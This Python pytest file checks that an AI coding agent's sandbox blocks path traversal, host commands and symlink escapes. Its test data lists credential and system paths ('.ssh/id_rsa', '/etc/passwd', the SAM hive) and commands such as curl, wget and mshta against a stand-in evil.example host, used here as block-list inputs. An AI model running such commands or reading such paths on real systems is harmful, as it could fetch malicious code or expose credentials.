from __future__ import annotations

import os
from pathlib import Path

import pytest

from app.agent.coder.workspace import Workspace
from app.sandbox.policy import (
    CommandPolicy,
    PathPolicy,
    PolicyViolation,
)
from app.sandbox.paths import PROJECT_ROOT
from app.sandbox.runner import SandboxCommandRunner
from app.sandbox.workspace import SandboxWorkspace


# Resources that must be unreachable BY CONSTRUCTION.
#
# PathPolicy is a CONTAINMENT policy, not a host denylist: absolute
# host paths / UNC / traversal must be refused, while suspicious
# relative names stay inside the sandbox workspace (and therefore
# cannot touch the host).
HOST_ESCAPE_PATHS = (
    r"C:\evil.txt",
    r"D:\evil.txt",
    r"F:\outside.txt",
    r"..\..\evil.txt",
    "../../evil.txt",
    r"\\server\share\evil.txt",
    "/etc/passwd",
    "C:/Windows/System32/config/SAM",
    r"%USERPROFILE%\.ssh\id_rsa",
)

SANDBOX_CONFINED_PATHS = (
    ".ssh/id_rsa",
    ".aws/credentials",
    "AppData/Roaming/Mozilla/Firefox/profiles.ini",
    "HKLM/SOFTWARE/Microsoft",
)

HOST_COMMANDS = (
    "powershell -c Get-ChildItem",
    "pwsh -c Get-ChildItem",
    "cmd /c dir",
    "cmd.exe /c whoami",
    "reg.exe query HKLM\\SOFTWARE",
    "sc.exe query",
    "schtasks /query",
    "wscript //B evil.js",
    "cscript //B evil.js",
    "mshta http://evil.example",
    "rundll32 evil.dll,Entry",
    "pip install requests",
    "python -m pip install requests",
    "pip3 install requests",
    "apt-get install curl",
    "npm install left-pad",
    "curl http://evil.example/x.sh",
    "wget http://evil.example/x.sh",
    "git clone http://evil.example/repo.git",
    "Invoke-WebRequest http://evil.example",
)


def _workspace(tmp_path: Path) -> Workspace:
    (tmp_path / "src").mkdir(parents=True, exist_ok=True)

    return Workspace(tmp_path)


def test_agent_workspace_can_never_be_the_host_project_root():
    with pytest.raises(ValueError):
        Workspace(PROJECT_ROOT)


def test_sandbox_runner_can_never_mount_the_host_project_root(
    tmp_path,
):
    with pytest.raises(ValueError):
        SandboxCommandRunner(
            sandbox_root=PROJECT_ROOT
        )

    _ = tmp_path


def test_workspace_exposes_no_host_terminal():
    # There is no host shell on the agent path: the Workspace simply
    # has no command surface at all.
    for attribute in (
        "terminal",
        "shell",
        "run",
        "subprocess",
        "popen",
    ):
        assert not hasattr(Workspace, attribute)


def test_agent_layer_never_imports_the_host_terminal():
    agent_root = (
        PROJECT_ROOT / "app" / "agent"
    )

    offenders: list[str] = []

    for path in agent_root.rglob("*.py"):
        for line in path.read_text(
            encoding="utf-8"
        ).splitlines():
            stripped = line.strip()

            if stripped.startswith("#"):
                continue

            if (
                "from app.tools.terminal_tools import"
                in stripped
            ):
                offenders.append(f"{path}: {stripped}")

            if (
                "import app.tools.terminal_tools"
                in stripped
            ):
                offenders.append(f"{path}: {stripped}")

            if "TerminalTools(" in stripped:
                offenders.append(f"{path}: {stripped}")

    assert offenders == []


@pytest.mark.parametrize("path", HOST_ESCAPE_PATHS)
def test_path_policy_refuses_host_resources(
    tmp_path,
    path,
):
    workspace = _workspace(tmp_path)

    with pytest.raises(PolicyViolation):
        workspace.files.policy.resolve(path)

    with pytest.raises(Exception):
        workspace.read(path)

    with pytest.raises(Exception):
        workspace.write(path, "owned")

    # Nothing escaped onto the host.
    assert not Path(r"C:\evil.txt").exists()
    assert not Path(r"D:\evil.txt").exists()
    assert not Path(r"F:\outside.txt").exists()


@pytest.mark.parametrize("path", SANDBOX_CONFINED_PATHS)
def test_suspicious_relative_paths_stay_inside_the_sandbox(
    tmp_path,
    path,
):
    workspace = _workspace(tmp_path)

    resolved = workspace.files.policy.resolve(path)

    # Confined: the path can only ever exist inside the workspace.
    assert resolved == (tmp_path / path).resolve()
    assert tmp_path.resolve() in resolved.parents

    workspace.write(path, "sandbox-only")

    written = workspace.read(path)

    assert written == "sandbox-only"

    # The write landed under the sandbox workspace, nowhere else.
    assert (tmp_path / path).read_text(
        encoding="utf-8"
    ) == "sandbox-only"


@pytest.mark.parametrize("command", HOST_COMMANDS)
def test_command_policy_refuses_host_commands(command):
    policy = CommandPolicy()

    with pytest.raises(PolicyViolation):
        policy.validate(command)


def test_policy_still_allows_normal_project_commands():
    policy = CommandPolicy()

    for command in (
        "python -m pytest -q",
        "python -m pytest tests/test_shutdown.py",
        "python -m py_compile src/app.py",
        "python -c \"import calculator\"",
    ):
        assert policy.validate(command) == command


def test_host_sibling_directories_are_not_in_the_sandbox(
    tmp_path,
):
    project = tmp_path / "project"
    project.mkdir()

    (project / "app.py").write_text(
        "VALUE = 1\n",
        encoding="utf-8",
    )

    outside = tmp_path / "outside"

    outside.mkdir()

    (outside / "secret.txt").write_text(
        "host-only",
        encoding="utf-8",
    )

    (tmp_path / ".ssh").mkdir()

    (tmp_path / ".ssh" / "id_rsa").write_text(
        "PRIVATE",
        encoding="utf-8",
    )

    sandbox = SandboxWorkspace.create(
        project_root=project
    )

    copied = sorted(
        str(path.relative_to(sandbox.workspace_root))
        for path in Path(
            sandbox.workspace_root
        ).rglob("*")
        if path.is_file()
    )

    assert copied == ["app.py"]

    # The sandbox physically contains no host secrets.
    for path in Path(sandbox.workspace_root).rglob("*"):
        assert path.name not in {"id_rsa", "secret.txt"}


def test_file_symlink_escape_is_refused(tmp_path):
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()

    outside = tmp_path / "outside.txt"

    outside.write_text("host-only", encoding="utf-8")

    link = workspace_dir / "escape.txt"

    try:
        os.symlink(outside, link)

    except (OSError, NotImplementedError):
        pytest.skip(
            "creating file symlinks requires privileges on "
            "this host; junction escape is covered separately"
        )

    policy = PathPolicy(workspace_dir)

    with pytest.raises(PolicyViolation):
        policy.resolve("escape.txt")

    workspace = Workspace(workspace_dir)

    with pytest.raises(Exception):
        workspace.write("escape.txt", "owned")

    assert outside.read_text(
        encoding="utf-8"
    ) == "host-only"
